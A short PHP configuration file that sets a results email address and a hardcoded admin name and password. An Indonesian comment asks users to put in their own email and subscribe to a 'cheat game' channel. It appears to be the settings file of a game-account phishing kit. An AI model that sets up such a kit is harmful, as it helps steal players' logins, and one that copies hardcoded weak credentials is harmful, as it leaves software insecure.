<?php
//-----------Your Email
$result = "affandiarif8@gmail.com"; // Ganti JADI EMAIL MU DAN SUBSCRIBE ARIF CHEAT GAME

//-----------Your ADMINname
$name = "admin7";


//-----------Your Password
$pass_word = "admin77";
?>